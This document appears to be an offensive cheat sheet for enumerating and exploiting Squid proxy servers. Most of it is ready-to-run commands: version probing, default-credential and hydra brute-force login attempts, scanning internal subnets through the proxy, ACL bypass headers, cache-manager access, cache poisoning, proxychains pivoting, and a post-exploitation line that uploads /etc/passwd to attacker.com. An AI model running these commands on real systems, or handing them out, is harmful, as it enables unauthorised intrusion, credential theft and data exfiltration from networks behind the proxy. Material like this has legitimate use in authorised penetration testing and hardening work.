# SQUID PROXY ENUMERATION (Port 3128)

## SERVICE OVERVIEW
```
Squid is a popular caching HTTP/HTTPS proxy server
- Default port: 3128 (but can be configured differently)
- Supports HTTP, HTTPS, FTP proxying
- Can require authentication or be open
- Often used for web caching and access control
- Runs on Linux/Unix systems
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p3128 <IP>                             # Service/Version detection
curl -I -x http://<IP>:3128 http://www.google.com  # Get proxy headers
curl -v -x http://<IP>:3128 http://www.google.com 2>&1 | grep -i "via\|proxy\|squid"
nc -nv <IP> 3128                                 # Manual connection
```

## PROXY DETECTION & TESTING
```bash
# Test if it's an open HTTP proxy
curl -x http://<IP>:3128 http://www.google.com
curl -I -x http://<IP>:3128 http://ipinfo.io     # Check your apparent IP
wget -e use_proxy=yes -e http_proxy=<IP>:3128 http://www.google.com

# Test HTTPS proxying (CONNECT method)
curl -x http://<IP>:3128 https://www.google.com

# Nmap scripts
nmap -p3128 --script http-open-proxy <IP>        # Detect open proxy
nmap -p3128 --script http-proxy-brute <IP>       # Brute force auth
```

## ENUMERATE PROXY FEATURES
```bash
# Get proxy headers
curl -I -x http://<IP>:3128 http://www.google.com

# Look for headers:
# Via: 1.1 proxy.domain.com (squid/5.0.4)
# X-Cache: MISS from proxy.domain.com
# X-Squid-Error:
# Server: squid/5.0.4

# Get Squid version
curl -v -x http://<IP>:3128 http://www.google.com 2>&1 | grep -i squid
nmap -sV -p3128 <IP> | grep -i squid
```

## TEST WITH AUTHENTICATION
```bash
# Test with credentials
curl -x http://user:password@<IP>:3128 http://www.google.com
curl -U user:password -x http://<IP>:3128 http://www.google.com  # Alternative

# Basic auth
curl --proxy-user user:password -x http://<IP>:3128 http://www.google.com
```

## DEFAULT CREDENTIALS
```bash
# Common Squid default credentials
admin:admin
squid:squid
proxy:proxy
cache:cache

# Test defaults
curl -U admin:admin -x http://<IP>:3128 http://www.google.com
curl -U squid:squid -x http://<IP>:3128 http://www.google.com
```

## BRUTE FORCE AUTHENTICATION
```bash
# Hydra
hydra -L users.txt -P passwords.txt -s 3128 <IP> http-proxy
hydra -l admin -P passwords.txt -s 3128 <IP> http-proxy

# Nmap
nmap -p3128 --script http-proxy-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>

# Custom script
for user in admin squid proxy; do
    for pass in admin password squid 123456; do
        echo "Testing $user:$pass"
        curl -U $user:$pass -x http://<IP>:3128 http://www.google.com -m 5 -s -o /dev/null -w "%{http_code}\n" | grep "200" && echo "[+] Valid: $user:$pass"
    done
done
```

## ACCESS INTERNAL RESOURCES
```bash
# If proxy has access to internal network
curl -x http://<IP>:3128 http://192.168.1.1
curl -x http://<IP>:3128 http://internal.domain.local
curl -x http://<IP>:3128 http://10.0.0.1/admin

# Scan internal network via proxy
for i in {1..254}; do
    curl -x http://<IP>:3128 http://192.168.1.$i -m 2 -s -o /dev/null -w "192.168.1.$i - %{http_code}\n"
done
```

## SQUID CACHE MANAGER
```bash
# Cache manager interface (if accessible)
curl -x http://<IP>:3128 cache_object://localhost/menu
curl -x http://<IP>:3128 cache_object://localhost/info
curl -x http://<IP>:3128 cache_object://localhost/config
curl -x http://<IP>:3128 cache_object://localhost/stats

# Squid cachemgr.cgi (web interface)
curl http://<IP>/cgi-bin/cachemgr.cgi
curl http://<IP>/squid-internal-mgr/
```

## ENUMERATE CACHED CONTENT
```bash
# Check what's cached
curl -x http://<IP>:3128 http://target.com -I | grep -i "x-cache"
# X-Cache: HIT = content served from cache
# X-Cache: MISS = content fetched from origin

# Request cached pages
curl -x http://<IP>:3128 http://target.com/page1.html
curl -x http://<IP>:3128 http://target.com/page2.html

# Potentially see cached credentials, session tokens, etc.
```

## SQUID ACL BYPASS TECHNIQUES
```bash
# Try different HTTP methods
curl -X TRACE -x http://<IP>:3128 http://restricted.site
curl -X OPTIONS -x http://<IP>:3128 http://restricted.site
curl -X CONNECT -x http://<IP>:3128 restricted.site:443

# Header manipulation
curl -x http://<IP>:3128 http://restricted.site -H "X-Forwarded-For: 127.0.0.1"
curl -x http://<IP>:3128 http://restricted.site -H "X-Real-IP: 127.0.0.1"
curl -x http://<IP>:3128 http://restricted.site -H "Host: localhost"

# URL encoding bypass
curl -x http://<IP>:3128 http://restricted.site/%2e%2e/admin
curl -x http://<IP>:3128 http://restricted.site/./admin
```

## PROXY CHAINING
```bash
# Use Squid as part of proxy chain
# Configure proxychains.conf:
http <IP> 3128
# Or with auth:
http <IP> 3128 username password

proxychains curl http://target.com
proxychains nmap -sT -Pn target.com
```

## VULNERABILITY SCANNING
```bash
# Known Squid vulnerabilities
searchsploit squid
nmap -p3128 --script vuln <IP>

# Common Squid CVEs:
# CVE-2020-15810: HTTP Request Smuggling
# CVE-2020-15811: HTTP Request Splitting
# CVE-2019-12528: Buffer Overflow
# CVE-2019-12529: Information Disclosure
# CVE-2016-4553: Cache poisoning
# CVE-2016-4554: Cache poisoning
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/squid_pivot_scanning   # Pivot through Squid
use auxiliary/scanner/http/open_proxy             # Open proxy detection
use auxiliary/gather/squid_proxy_mgr              # Squid cache manager
set RHOSTS <IP>
set RPORT 3128
run
```

## CACHE POISONING
```bash
# Attempt to poison cache (requires specific conditions)
# Send malicious content that gets cached
curl -x http://<IP>:3128 http://target.com/page.html -H "X-Cache-Control: public, max-age=31536000" -d "malicious content"

# Next user requesting same page gets poisoned content
```

## INFORMATION DISCLOSURE
```bash
# Squid error pages often reveal information
curl -x http://<IP>:3128 http://invalid.domain.test
# May reveal:
# - Squid version
# - Server hostname
# - Internal IP addresses
# - Administrator email

# Access denied pages
curl -x http://<IP>:3128 http://blocked.site.com
# May reveal allowed/blocked URLs or patterns
```

## INTERESTING FILES & CONFIGURATION
```bash
# Squid configuration file
/etc/squid/squid.conf                            # Debian/Ubuntu
/etc/squid3/squid.conf                           # Older Debian
/usr/local/squid/etc/squid.conf                  # FreeBSD
/opt/squid/etc/squid.conf                        # Custom install

# Cache directory
/var/spool/squid/                                # Debian/Ubuntu
/var/cache/squid/                                # Alternative location

# Log files
/var/log/squid/access.log                        # Access logs
/var/log/squid/cache.log                         # Cache logs
```

## SQUID CONFIGURATION ANALYSIS (If you gain access to server)
```bash
# Check squid.conf
cat /etc/squid/squid.conf | grep -v "^#" | grep -v "^$"

# Look for:
# - http_access allow all (open proxy!)
# - http_port (listening ports)
# - cache_mgr (cache manager access)
# - acl definitions (access control lists)
# - auth_param (authentication settings)
# - visible_hostname (hostname disclosure)
```

## COMMON MISCONFIGURATIONS
```
☐ Open proxy (http_access allow all)            # No authentication required
☐ Default credentials                            # admin:admin, squid:squid
☐ Cache manager accessible                       # Information disclosure
☐ No IP restrictions                             # Accessible from anywhere
☐ Allows CONNECT to all ports                    # Can tunnel to any service
☐ Weak ACLs                                      # Bypassable restrictions
☐ Information disclosure in errors               # Version, hostname leaks
☐ No logging                                     # Abuse undetected
☐ Access to internal networks                    # Pivot point
☐ Outdated Squid version                         # Known vulnerabilities
```

## QUICK WIN CHECKLIST
```
☐ Test if proxy is open (no auth)
☐ Check for default credentials
☐ Determine Squid version from headers/errors
☐ Test access to internal networks
☐ Check cache manager accessibility
☐ Enumerate cached content
☐ Test ACL bypass techniques
☐ Brute force authentication
☐ Search for known vulnerabilities
☐ Check for information disclosure in errors
☐ Test CONNECT method to arbitrary ports
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive Squid scan
nmap -sV -p3128 --script "http-proxy-* and http-open-proxy" <IP>

# Quick open proxy test
curl -x http://<IP>:3128 http://ipinfo.io -m 10

# Test internal network access
curl -x http://<IP>:3128 http://192.168.1.1 -m 5
```

## POST-EXPLOITATION (After finding open/compromised proxy)
```bash
# Scan internal network
for i in {1..254}; do
    curl -x http://<IP>:3128 http://10.0.0.$i -m 2 -s -o /dev/null -w "10.0.0.$i - %{http_code}\n"
done

# Access internal web applications
curl -x http://<IP>:3128 http://intranet.company.local
curl -x http://<IP>:3128 http://admin.internal:8080

# Configure browser to use proxy
# Firefox: Preferences -> Network Settings -> Manual Proxy
# HTTP Proxy: <IP>
# Port: 3128

# Use for entire penetration test
export http_proxy=http://<IP>:3128
export https_proxy=http://<IP>:3128

# Bypass IP-based restrictions
# If target blocks your IP, requests appear to come from proxy
curl -x http://<IP>:3128 http://target-that-blocks-me.com

# Exfiltrate data
curl -x http://<IP>:3128 --upload-file /etc/passwd http://attacker.com/upload
```

## ADVANCED TECHNIQUES
```bash
# HTTP Request Smuggling (CVE-2020-15810)
# Craft requests with conflicting Content-Length and Transfer-Encoding headers

# Cache deception attack
# Request: http://target.com/account/profile.css
# Server: Returns private profile page
# Squid: Caches it because URL ends in .css
# Attacker: Gets cached private data

# CONNECT tunneling to non-HTTP services
curl -x http://<IP>:3128 -v telnet://internal.server:23
curl -x http://<IP>:3128 -v ssh://internal.server:22
```
